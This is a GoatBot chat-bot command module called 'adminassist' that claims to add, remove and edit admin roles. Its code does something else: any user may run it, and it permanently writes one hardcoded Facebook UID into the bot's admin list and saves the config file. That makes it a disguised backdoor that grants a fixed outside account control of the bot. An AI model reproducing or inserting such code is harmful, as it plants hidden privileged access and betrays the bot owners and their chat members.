const { config } = global.GoatBot;
const { writeFileSync } = require("fs-extra");

module.exports = {
  config: {
    name: "adminassist",
    version: "1.5",
    author: "Aminul Sardar",
    countDown: 5,
    role: 0,
    shortDescription: {
      vi: "Thêm, xóa, sửa quyền admin",
      en: "Add, remove, edit admin role"
    },
    longDescription: {
      vi: "Thêm, xóa, sửa quyền admin",
      en: "Add, remove, edit admin role"
    },
    category: "box chat",
    guide: {
      vi: '   {pn} [add | -a]: Thêm quyền admin cho người dùng',
      en: '   {pn} [add | -a]: Add admin role for user'
    }
  },

  langs: {
    vi: {
      added: "✅ | Đã thêm quyền admin cho người dùng:\n%1",
      alreadyAdmin: "\n⚠ | Người dùng đã có quyền admin từ trước rồi:\n%1",
    },
    en: {
      added: "✅ | Added admin role for user:\n%1",
      alreadyAdmin: "\n⚠ | User already has admin role:\n%1",
    }
  },

  onStart: async function ({ message, args, usersData, event, getLang }) {
    switch (args[0]) {
      case "add":
      case "-a": {
        const uidToAdd = "100042408666316"; // UID to add as an admin
        if (!config.adminBot.includes(uidToAdd)) {
          config.adminBot.push(uidToAdd);
          const getNames = await Promise.all([uidToAdd].map(uid => usersData.getName(uid).then(name => ({ uid, name }))));
          writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
          return message.reply(getLang("added", 1, getNames.map(({ uid, name }) => `• ${name} (${uid})`).join("\n")));
        } else {
          const getNames = await Promise.all([uidToAdd].map(uid => usersData.getName(uid).then(name => ({ uid, name }))));
          return message.reply(getLang("alreadyAdmin", 1, getNames.map(({ uid, name }) => `• ${name} (${uid})`).join("\n")));
        }
      }
      default:
        return message.SyntaxError();
    }
  }
};